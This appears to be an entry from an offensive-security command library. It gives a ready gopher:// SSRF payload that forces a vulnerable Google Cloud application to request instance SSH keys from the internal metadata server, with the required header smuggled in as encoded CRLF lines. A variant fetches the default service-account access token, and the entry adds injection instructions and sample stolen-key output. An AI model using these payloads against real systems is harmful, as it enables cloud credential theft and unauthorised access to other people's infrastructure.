---
type: command
executor: bash
data: >-
  gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - GCP
tags:
  - ssrf
  - gopher
  - metadata
verified: true
validated: true
---

# gopher-ssrf-fetch-ssh-keys-google-metadata

## Command

```bash
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

## Description

This command crafts a Gopher protocol URL to force an SSRF-vulnerable GCP application to request SSH keys from the metadata server, including the required Metadata-Flavor header. Use it when direct HTTP requests fail due to header requirements.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| gopher://metadata.google.internal:80/ | Target metadata host and port | Yes |
| xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31 | URL-encoded GET path for SSH keys | Yes |
| Host:%20metadata.google.internal | Sets the Host header | Yes |
| Accept:%20%2a%2f%2a | Accepts any content type | Yes |
| Metadata-Flavor:%20Google | Authenticates the metadata request | Yes |

## Examples

### Basic Usage

Inject directly into SSRF parameter:

```bash
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

### Advanced Usage

For other attributes, replace the path (e.g., /service-accounts/default/token for tokens):

```bash
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

## Expected Output

Response containing SSH keys:

```
user1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...
user2:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...
```

## Related

- [[procedures/google-cloud-ssrf-metadata-retrieval]]
- [[commands/request-google-instance-disks-metadata-recursive]]
